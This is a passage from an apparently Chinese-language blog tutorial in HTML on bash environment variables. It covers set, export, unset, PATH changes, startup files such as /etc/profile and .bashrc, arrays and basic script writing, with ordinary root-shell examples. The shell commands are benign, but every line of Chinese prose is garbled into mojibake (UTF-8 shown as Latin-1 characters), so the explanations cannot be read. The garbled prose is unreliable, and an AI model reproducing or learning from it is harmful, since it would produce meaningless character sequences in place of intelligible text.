title="å±€éƒ¨ç¯å¢ƒå˜é‡"></a>å±€éƒ¨ç¯å¢ƒå˜é‡</h3><p>æŸ¥çœ‹å±€éƒ¨å˜é‡</p><blockquote><p>åœ¨Linuxç³»ç»Ÿå¹¶æ²¡æœ‰ä¸€ä¸ªåªæ˜¾ç¤ºå±€éƒ¨ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºå…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚å®ƒè¿˜ä¼šæŒ‰ç…§å­—æ¯é¡ºåºå¯¹ç»“æœè¿›è¡Œæ’åºã€‚</p><p>envå’Œprintenvå‘½ä»¤åŒsetå‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰ä¸¤ä¸ªå‘½ä»¤ä¸ä¼šå¯¹å˜é‡æ’åºï¼Œä¹Ÿä¸ä¼šè¾“å‡ºå±€éƒ¨å˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote></li></ul><h3 id="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"><a href="#è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡" class="headerlink" title="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"></a>è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡</h3><blockquote><p>ä¸€æ—¦å¯åŠ¨äº†bash shellï¼ˆæˆ–è€…æ‰§è¡Œä¸€ä¸ªshellè„šæœ¬ï¼‰ï¼Œå°±èƒ½åˆ›å»ºåœ¨è¿™ä¸ªshellè¿›ç¨‹å†…å¯è§çš„å±€éƒ¨å˜é‡äº†ã€‚</p><p>å¯ä»¥é€šè¿‡ç­‰å·ç»™ç¯å¢ƒå˜é‡èµ‹å€¼ï¼Œå€¼å¯ä»¥æ˜¯æ•°å€¼æˆ–å­—ç¬¦ä¸²ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå› ä¸ºæ²¡æœ‰å®šä¹‰first_varå˜é‡ï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©ºã€‚</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">æ³¨ï¼šå®šä¹‰å˜é‡æ—¶æ— éœ€åŠ ä¸Š$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">æ³¨ï¼šåœ¨ä¸ºå˜é‡èµ‹å€¼å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ‰å¼•å·ï¼Œå°±éœ€è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ã€‚</span><br><span class="line">å¼•ç”¨ï¼šæ²¡æœ‰å•å¼•å·çš„è¯ï¼Œbash shellä¼šä»¥ä¸ºä¸‹ä¸€ä¸ªè¯æ˜¯å¦ä¸€ä¸ªè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">æ³¨ï¼šå˜é‡å’Œ=å’Œå€¼ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™shellä¼šæŠŠå…¶å½“æˆå‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å±€éƒ¨å˜é‡çš„èŒƒå›´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="è®¾ç½®å…¨å±€å˜é‡"></a>è®¾ç½®å…¨å±€å˜é‡</h3><blockquote><p>åˆ›å»ºå…¨å±€ç¯å¢ƒå˜é‡çš„æ–¹æ³•æ˜¯å…ˆ<strong>åˆ›å»º</strong>ä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç„¶åå†æŠŠå®ƒ<strong>å¯¼å‡º</strong>åˆ°å…¨å±€ç¯å¢ƒä¸­ã€‚</p></blockquote><p><code>export var_name</code>ï¼šå¯¼å‡ºå­shellçš„å±€éƒ¨å˜é‡åˆ°å…¨å±€ç¯å¢ƒä¸­ï¼ˆ<strong>ä¸´æ—¶ä¿®æ”¹</strong>ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘å‘ç°åªèƒ½åœ¨ç™»å½•ç»ˆç«¯çš„é‚£ä¸ªshellä¸­exportï¼Œä¸èƒ½åœ¨å­shellä¸­exportï¼Ÿ</p><p>å› ä¸ºexportçš„ä½œç”¨æ˜¯è®©å­shellå¯ä»¥ç»§æ‰¿çˆ¶shellå¯¼å‡ºè¿‡çš„å˜é‡ã€‚</p><p>å¹¶ä¸”å¦‚æœåœ¨å­shellä¸­ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°çˆ¶shellä¸­è¯¥å…¨å±€å˜é‡çš„å€¼ã€‚</p></blockquote><h3 id="åˆ é™¤ç¯å¢ƒå˜é‡"><a href="#åˆ é™¤ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ é™¤ç¯å¢ƒå˜é‡"></a>åˆ é™¤ç¯å¢ƒå˜é‡</h3><p><code>unset var_name</code>ï¼šåˆ é™¤ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®PATHç¯å¢ƒå˜é‡"><a href="#è®¾ç½®PATHç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®PATHç¯å¢ƒå˜é‡"></a>è®¾ç½®PATHç¯å¢ƒå˜é‡</h3><blockquote><p>PATHç¯å¢ƒå˜é‡å®šä¹‰äº†ç”¨äºè¿›è¡Œå‘½ä»¤å’Œç¨‹åºæŸ¥æ‰¾çš„ç›®å½•ã€‚</p></blockquote><p>ä¸‹é¢æ¼”ç¤ºäº†åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹ä½¿ç”¨è¯¥å‘½ä»¤ã€‚</p><ul><li><p>åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå‘½ä»¤å†…å®¹ä¸ºè¾“å‡ºâ€™hello khazâ€™ï¼Œå¹¶å°†å…¶ç§»åŠ¨åˆ°å­˜æ”¾è‡ªå®šä¹‰å‘½ä»¤çš„ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å› ä¸ºä¸å‘½ä»¤ä¸åœ¨åŒä¸€è·¯å¾„ä¸‹ï¼Œæç¤ºæ‰¾ä¸åˆ°å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å¹¶å¢åŠ PATHï¼ˆè·¯å¾„ä»¥ï¼šåˆ†éš”ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å†æ¬¡è¾“å…¥å‘½ä»¤æˆåŠŸæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ç§æ–¹æ³•å¯¹PATHå˜é‡çš„ä¿®æ”¹åªèƒ½æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿã€‚</p></blockquote></li></ul><h3 id="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"><a href="#è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–" class="headerlink" title="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"></a>è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–</h3><blockquote><p>æŠŠæˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒå˜é‡æ”¾åœ¨shellçš„å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶ä¸­ã€‚</p><p>æˆ–è€…å¼€æœºå¯åŠ¨é¡¹<code>/etc/init.d/</code>å’Œ<code>/etc/profile.d/</code></p></blockquote><ul><li><p>å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶</p><blockquote><p>ç™»å…¥Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªbash shellæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹bashä¼šåœ¨å‡ ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾å‘½ä»¤ã€‚</p><p>è¿™äº›æ–‡ä»¶å«ä½œå¯åŠ¨æ–‡ä»¶æˆ–ç¯å¢ƒæ–‡ä»¶ã€‚</p></blockquote></li><li><p>5ä¸ªä¸åŒçš„å¯åŠ¨æ–‡ä»¶</p><p>ï± &#x2F;etc&#x2F;profile </p><p>ï± $HOME&#x2F;.bash_profile </p><p>ï± $HOME&#x2F;.bashrc </p><p>ï± $HOME&#x2F;.bash_login </p><p>ï± $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profileæ–‡ä»¶</p><blockquote><p>&#x2F;etc&#x2F;profileæ–‡ä»¶æ˜¯bash shellé»˜è®¤çš„çš„ä¸»å¯åŠ¨æ–‡ä»¶ã€‚</p><p>åªè¦ä½ ç™»å½•äº†Linuxç³»ç»Ÿï¼Œbashå°±ä¼šæ‰§è¡Œ&#x2F;etc&#x2F;profileå¯åŠ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­çš„forè¯­å¥ä¸ºLinuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ªæ”¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºå¯åŠ¨æ–‡ä»¶çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œshellä¼šæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>ä¸éš¾å‘ç°ï¼Œæœ‰äº›æ–‡ä»¶ä¸ç³»ç»Ÿä¸­çš„ç‰¹å®šåº”ç”¨æœ‰å…³ã€‚</p><p>å¤§éƒ¨åˆ†åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸¤ä¸ªå¯åŠ¨æ–‡ä»¶ï¼šä¸€ä¸ªä¾›bash shellä½¿ç”¨ï¼ˆä½¿ç”¨.shæ‰©å±•åï¼‰ï¼Œä¸€ä¸ªä¾›c shellä½¿ç”¨ï¼ˆä½¿ç”¨.cshæ‰©å±•åï¼‰ã€‚</p><p>å…¶ä¸­lang.cshå’Œlang.shæ–‡ä»¶æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦é›†çš„ã€‚</p></blockquote></li><li><p>$HOMEç›®å½•ä¸‹çš„å¯åŠ¨æ–‡ä»¶</p><blockquote><p>è¿™äº›å¯åŠ¨æ–‡ä»¶éƒ½èµ·ç€åŒä¸€ä¸ªä½œç”¨ï¼šæä¾›ä¸€ä¸ªç”¨æˆ·ä¸“å±çš„å¯åŠ¨æ–‡ä»¶æ¥å®šä¹‰è¯¥ç”¨æˆ·æ‰€ç”¨åˆ°çš„ç¯</p><p>å¢ƒå˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>è¿™é‡Œå…ˆä¼šåˆ¤æ–­.bashrcæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è®¾ç½®åˆ«åï¼Œæ¯”å¦‚æˆ‘æ·»åŠ <code>alias la=&#39;ls -a&#39;</code>,é‡å¯shellå</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>åˆ™åº”è¯¥æ˜¯ç™»å½•shellåè‡ªåŠ¨æ·»åŠ è·¯å¾„åˆ°PATHä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç¼–è¾‘ä¸ºPATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">é‡å¯shellå/sourceç«‹å³ç”Ÿæ•ˆå</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"><a href="#ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ" class="headerlink" title="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"></a>ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå˜é‡ç‰¹æ€§"><a href="#ç¯å¢ƒå˜é‡ç‰¹æ€§" class="headerlink" title="ç¯å¢ƒå˜é‡ç‰¹æ€§"></a>ç¯å¢ƒå˜é‡ç‰¹æ€§</h3><blockquote><p>ç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§å°±æ˜¯ï¼Œå®ƒä»¬å¯ä½œä¸ºæ•°ç»„ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨å˜é‡æ—¶æœ€å¥½å°†å˜é‡åç”¨{}æ‹¬èµ·æ¥ï¼Œå¦åˆ™å¯èƒ½ä¼šè§£æé”™è¯¯ã€‚</p><h1 id="shellè„šæœ¬ç¼–å†™"><a href="#shellè„šæœ¬ç¼–å†™" class="headerlink" title="shellè„šæœ¬ç¼–å†™"></a>shellè„šæœ¬ç¼–å†™</h1><ol><li><p>åˆ›å»ºshellè„šæœ¬</p><blockquote><p>åœ¨åˆ›å»ºshellè„šæœ¬æ–‡ä»¶æ—¶ï¼Œå¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„shellã€‚å…¶æ ¼å¼ä¸ºï¼š<code>#!/bin/bash </code></p><p>åœ¨é€šå¸¸çš„shellè„šæœ¬ä¸­ï¼Œäº•å·ï¼ˆ#ï¼‰ç”¨ä½œæ³¨é‡Šè¡Œã€‚shellå¹¶ä¸ä¼šå¤„ç†shellè„šæœ¬ä¸­çš„æ³¨é‡Šè¡Œã€‚ç„¶è€Œï¼Œ</p><p>shellè„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæ˜¯ä¸ªä¾‹å¤–ï¼Œ#åé¢çš„æƒŠå¹å·ä¼šå‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®æƒé™</p><p><code>sudo chmod +x file_name </code></p></li><li><p>è¿è¡Œè„šæœ¬</p><ul><li>shell è„šæœ¬æ–‡ä»¶å</li><li>chmod +x è„šæœ¬æ–‡ä»¶å; è„šæœ¬æ–‡ä»¶å</li><li>. è„šæœ¬æ–‡ä»¶å</li><li>source è„šæœ¬æ–‡ä»¶å</li></ul></li></ol><p>è„šæœ¬æ–‡ä»¶åå¦‚<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom: 80%;" /><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><h4 id="å®šä¹‰ä¸ä½¿ç”¨"><a href="#å®šä¹‰ä¸ä½¿ç”¨" class="headerlink" title="å®šä¹‰ä¸ä½¿ç”¨"></a>å®šä¹‰ä¸ä½¿ç”¨</h4><blockquote><p>å¦‚æœè¦ç”¨åˆ°å˜é‡ï¼Œä½¿ç”¨$ï¼›</p><p>å¦‚æœè¦æ“ä½œå˜é‡ï¼Œä¸ä½¿ç”¨$ã€‚</p><p>è¿™æ¡è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–å°±æ˜¯ä½¿ç”¨printenvæ˜¾ç¤ºæŸä¸ªå˜é‡çš„å€¼ã€‚</p></blockquote><p>ç”¨åˆ°å˜é‡ â†’ ç”¨åˆ°å˜é‡çš„å€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #è¾“å‡ºå˜é‡çš„å€¼</span><br><span class="line">printenv PATH #ç”¨åˆ°å˜é‡çš„å€¼ï¼Œä½†ä¸éœ€è¦åŠ $</span><br></pre></td></tr></table></figure><p>æ“ä½œå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #å®šä¹‰å˜é‡</span><br><span class="line">export a #å¯¼å‡ºå˜é‡</span><br><span class="line">unset a #åˆ é™¤å˜é‡</span><br></pre></td></tr></table></figure><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><p>èƒ½å¤Ÿè®©å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  web</span><br></pre></td></tr></table></figure><p>å†…æ•›æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span 